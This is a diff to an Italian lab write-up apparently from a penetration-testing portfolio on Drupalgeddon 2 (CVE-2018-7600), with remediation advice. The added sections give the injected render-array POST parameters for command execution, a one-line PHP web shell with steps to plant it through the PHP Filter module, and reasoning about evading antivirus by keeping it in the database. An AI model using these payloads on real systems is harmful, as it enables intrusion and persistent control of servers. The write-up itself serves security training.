@@ -1,3 +1,5 @@
+> [English](README.en.md) | **Italiano**
+
 # Drupal Core Remote Code Execution (Drupalgeddon 2)
 
 > - **Fase:** Web Attack - CMS Exploitation
@@ -101,6 +103,83 @@ Si raccomanda di applicare le seguenti azioni correttive con urgenza immediata:
     - Disabilitare funzioni PHP pericolose nel file `php.ini` (es. `disable_functions = exec,passthru,shell_exec,system`).
     - Disabilitare il modulo "PHP Filter" se non strettamente necessario.
     - Rimuovere file non necessari come `CHANGELOG.txt` o `INSTALL.txt` dalla root del sito per complicare il fingerprinting.
+
+---
+
+## Analisi a Basso Livello: Meccanica di Drupalgeddon 2
+
+### Form API Rendering Pipeline
+
+CVE-2018-7600 sfrutta il modo in cui Drupal processa i form attraverso il suo Form API. La vulnerabilita risiede nel sottosistema di rendering AJAX:
+
+```
+Flusso normale di un form Drupal:
+1. Browser invia POST con parametri del form
+2. Drupal Form API valida i campi
+3. Se AJAX request: il server renderizza solo l'elemento richiesto
+4. Il rendering usa le "render arrays" (#type, #markup, #post_render)
+
+Flusso dell'exploit:
+1. Attaccante invia POST con render array iniettato:
+   mail[#post_render][] = exec
+   mail[#type] = markup
+   mail[#markup] = "id"         <- comando arbitrario
+
+2. Drupal processa il parametro "mail" come render array
+3. Il callback #post_render viene invocato DOPO il rendering
+4. exec("id") viene eseguito con i privilegi del web server
+
+Perche funziona:
+- Drupal NON distingue tra parametri di form e render array properties
+- I caratteri "#" nei nomi dei parametri indicano proprieta interne
+- L'attaccante puo iniettare proprieta di rendering tramite parametri POST
+- #post_render accetta callable PHP (exec, passthru, system)
+```
+
+### PHP Filter Module: Persistenza Nativa
+
+Il modulo "PHP Filter" e un componente core di Drupal (disabilitato per default dalla versione 8) che permette di inserire codice PHP nei nodi di contenuto:
+
+```
+Deploy Web Shell via PHP Filter:
+
+1. Admin -> Modules -> Abilita "PHP Filter"
+2. Content -> Add content -> Basic page
+3. Text format: "PHP code" (dropdown)
+4. Body: <?php if(isset($_GET['c'])){echo system($_GET['c']);} ?>
+5. Salva come pagina pubblica
+
+Accesso web shell:
+http://target/node/123?c=whoami
+-> www-data
+
+Vantaggi per l'attaccante:
+- La web shell e un "nodo" Drupal legittimo (sopravvive agli aggiornamenti)
+- Non modifica file su disco (elude file integrity monitoring)
+- Il codice PHP e nel database, non nel filesystem
+- Appare come una pagina normale nel CMS
+```
+
+### Drupal vs WordPress: Confronto Superficie di Attacco
+
+| Aspetto | WordPress | Drupal |
+| :--- | :--- | :--- |
+| Versioning esposto | `readme.html`, meta generator | `CHANGELOG.txt`, `INSTALL.txt` |
+| Plugin path | `/wp-content/plugins/` | `/sites/all/modules/`, `/modules/` |
+| Admin panel | `/wp-admin/` (nascondibile) | `/user/login` (non nascondibile) |
+| RCE post-auth | Theme Editor (PHP diretto) | PHP Filter module (nel database) |
+| API REST | `/wp-json/` (dalla 4.7) | `/jsonapi/` (dalla 8.x) |
+| Scanner dedicato | WPScan | Droopescan |
+
+---
+
+## Esperienza di Laboratorio
+
+Il tentativo iniziale con exploit automatici (Metasploit `drupal_drupalgeddon2`) e stato bloccato da Windows Defender sulla macchina target. Questo ha forzato il passaggio all'exploitation manuale via curl, che si e rivelata piu formativa: costruire il payload POST a mano ha richiesto di comprendere la meccanica del Form API render array, non solo di lanciare un modulo preconfigurato.
+
+La scelta di usare il PHP Filter module per la persistenza invece di scrivere un file PHP su disco e stata dettata dalla necessita: Windows Defender monitorava le scritture nella webroot ma non il contenuto del database Drupal. Questo ha evidenziato una lacuna comune nelle difese: gli antivirus controllano il filesystem ma non il database, dove il codice PHP viene memorizzato come testo nel campo `body_value` della tabella `node__body`.
+
+L'output di `ipconfig` tramite la web shell ha confermato che il server girava su Windows con interfaccia di rete configurata in DHCP, informazione utile per il lateral movement. In un engagement reale, il passo successivo sarebbe stato l'upload di un agent C2 (Covenant, Sliver) per ottenere una shell interattiva e procedere con il pivoting nella rete interna.
 
 ---
 
